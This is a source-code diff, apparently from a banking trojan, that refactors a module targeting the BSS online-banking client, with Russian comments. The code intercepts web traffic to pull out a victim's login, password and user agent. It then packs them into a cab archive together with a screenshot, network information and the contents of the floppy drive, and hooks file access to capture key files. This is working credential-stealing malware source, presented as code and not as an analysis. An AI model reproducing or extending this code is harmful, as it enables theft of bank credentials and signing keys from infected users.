@@ -2,7 +2,8 @@
 
 #include "Loader.h"
 #include "Utils.h"
-
+#include "StrConsts.h"
+#include "ScreenShots.h"
 #include "BotClasses.h"
 
 //bss
@@ -231,7 +232,7 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 			{
 				if ( CompareUrl( "*bsi.dll*", Url ) )
 				{
-					char *Buffer = (char*)MemAlloc( 1024 );
+					//char *Buffer = (char*)MemAlloc( 1024 );
 
 					PCHAR Tmp = (PCHAR)lpBuffer;
 					PCHAR Login		= GetTextBetween(Tmp,  "<L>", "</L>" );
@@ -256,106 +257,50 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 							UserAgent[1] = '\0';
 						}
 
-						char Template[] = "Url: %s\r\n"
-										  "Login: %s\r\n"
-										  "Password: %s\r\n"
-										  "UserAgent: %s\r\n";
 
-						typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
-						fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
+                        // Создаём лог
+						string Log;
+						Log.Format(GetStr(BSSLogTemplate).t_str(), Url, Login, Password, UserAgent);
 
-						pwsprintfA( Buffer, Template, Url, Login, Password, UserAgent );
+						// Записываем данные в файл
 
-						PCHAR TempFile = File::GetTempNameA();
-						bool AddLog = false;
-
-						if ( TempFile )
+						if (InitializeBSS())
 						{
-							HANDLE hLog = (HANDLE)pCreateFileA( TempFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
-							if ( hLog != INVALID_HANDLE_VALUE )
+							// Добавляем лог
+							AddStringToCab(BSSLog->hCab, Log, GetStr(StrLogFileInformation));
+							BSSLog->Form = true;
+
+							// Добавляем скриншот
+							PCHAR ScreenFile = File::GetTempNameA();
+
+							if (ScreenShot::CaptureScreenA(ScreenFile))
+								AddFileToCab( BSSLog->hCab, ScreenFile, GetStr(StrLogFileScreenShot));
+
+							STR::Free(ScreenFile);
+
+
+							// Добавляем информацию о конфигурации сети
+							PCHAR NetFile = GetNetInfo();
+
+							if (NetFile)
 							{
-								DWORD dwWritten = 0;
-
-								if ( (BOOL)pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 ) )
-								{
-									AddLog = true;
-								}
-
+								AddFileToCab( BSSLog->hCab, NetFile, GetStr(StrLogFileNetInfo));
+								pDeleteFileA( NetFile );
 							}
+							STR::Free(NetFile);
 
-							pCloseHandle( hLog );
+							// Добавляем содержимое флопика
+							pSetErrorMode( SEM_FAILCRITICALERRORS );
+							if (AddDirToCab( BSSLog->hCab, "A:", "Floppy" ))
+								BSSLog->bFloppy = true;
+
+
+							// Ставим хуки на доступ к файлам, для перехвата
+							// ключей
+                            HookBSSCreateFileW();
 						}
-
-
-						if ( AddLog )
-						{
-							if ( InitializeBSS() )
-							{
-								if ( AddFileToCab( BSSLog->hCab, TempFile, "Information.txt" ) )
-								{
-									LPVOID lpScrFile = NULL;
-									DWORD dwScrSize = 0;
-
-									GetScreen( &lpScrFile, &dwScrSize );
-
-									bool bAddScreen  = false;
-									PCHAR ScreenFile = File::GetTempNameA();
-
-									if ( lpScrFile && ScreenFile )
-									{										
-										HANDLE hScreen = (HANDLE)pCreateFileA( ScreenFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
-
-										if ( hScreen != INVALID_HANDLE_VALUE )
-										{
-											DWORD dwWritten = 0;
-
-											if ( (BOOL)pWriteFile( hScreen, lpScrFile, dwScrSize, &dwWritten, 0 ) )
-											{
-												bAddScreen = true;
-											}
-										}
-
-										pCloseHandle( hScreen );
-									}			
-
-									MemFree( lpScrFile );
-
-									if ( bAddScreen )
-									{
-										AddFileToCab( BSSLog->hCab, ScreenFile, "screen.jpeg" );
-									}
-
-									STR::Free( ScreenFile );
-
-									char *NetFile = GetNetInfo();
-
-									if ( NetFile != NULL )
-									{
-										AddFileToCab( BSSLog->hCab, NetFile, "NetInfo.txt" );
-										pDeleteFileA( NetFile );
-									}
-
-									STR::Free( NetFile );
-
-									pDeleteFileA( TempFile );
-									BSSLog->Form = true;
-
-									pSetErrorMode( SEM_FAILCRITICALERRORS ); 
-
-									if ( AddDirToCab( BSSLog->hCab, "A:", "Floppy" ) )
-									{
-										BSSLog->bFloppy = true;
-									}
-
-									HookBSSCreateFileW();
-								}
-							}
-						}
-
-						STR::Free( TempFile );
 					}
 
-					MemFree( Buffer );
 					STR::Free( Login );
 					STR::Free( Password );
 				}
